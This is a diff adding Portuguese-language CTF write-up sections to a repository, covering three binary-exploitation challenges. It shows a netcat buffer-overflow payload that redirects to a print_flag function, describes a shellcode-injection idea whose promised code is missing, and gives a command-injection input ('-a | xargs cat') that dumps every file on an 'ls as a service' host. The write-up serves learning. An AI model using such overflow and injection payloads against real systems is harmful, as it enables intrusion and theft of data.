@@ -227,6 +227,56 @@ p.sendline("A" * 43 + flag)
 p.interactive()
 ```
 
+### Pwn2 ###
+Este desafio também é bastante similar ao anterior. Nosso comando shell agora é
+```shell
+nc 18.228.166.40 4322
+```
+Ao analisar o código executável pelo site [OnlineDisassembler](#online-disassembler) é possível ver uma função de nome 'select_func', que é chamada dentro da função main.
+E também é possível ver a nossa função de nome print_flag, homônima à nossa função do desafio anterior.
+![Desired function](https://github.com/leoplana/ctf-zup-2020/blob/master/pwn/pwn2-step1.png)
+Dado que temos o endereço da função que desejamos executar, basta fazer o overflow e atribuir esse endereço para que select_func chame ela para nós.
+O código em shell abaixo faz esse trabalho
+
+```shell
+echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xd8" |  nc 18.228.166.40 4322
+```
+
+### Pwn3 ###
+Parece que todos os desafios pwn vão ser baseados em buffer overflow, mas esse agora nos retorna um endereço de forma dinâmica.
+```shell
+nc 18.228.166.40 4323
+```
+Retorna, a cada execução, um endereço diferente, e nos diz que esse endereço irá nos ajudar na solução.
+```shell
+nc 18.228.166.40 4323
+Take this, you might need it on your journey 0xfff384be!
+ok
+nc 18.228.166.40 4323
+Take this, you might need it on your journey 0xffb7dace!
+damn it
+```
+Ao analisar o código "decompilado" é possível ver que o que nós escrevemos como input é atribuído ao endereço retornado,
+e se então nós escrevermos um código shell nesse endereço e então pular para esse endereço?
+O código python abaixo realiza exatamente essa função
+
+
+
+### Pwn4 ###
+Este desafio também nos dá um arquivo sem extensão alguma, e outra instrução shell
+Fazendo a execução do shell diretamente no [netcat](#netcat) o código nos informa que se trata de um "ls" as a service, ou seja, ele nos fornece a opção de rodar um ls passando os parâmetros que desejarmos. O comando ls lista os arquivos e pastas do diretório atual, para listar então os conteúdos desses arquivos utilizei o script abaixo
+
+```shell
+-a | xargs cat
+```
+
+E considerando que se trata de um LS as a service o comando ficaria 
+
+```shell
+ls -a | xargs cat
+```
+
+nos retornando como output o conteúdo de todos os arquivos da pasta, incluindo a nossa flag.txt!
 
 ## Aplicações Web :globe_with_meridians:
 
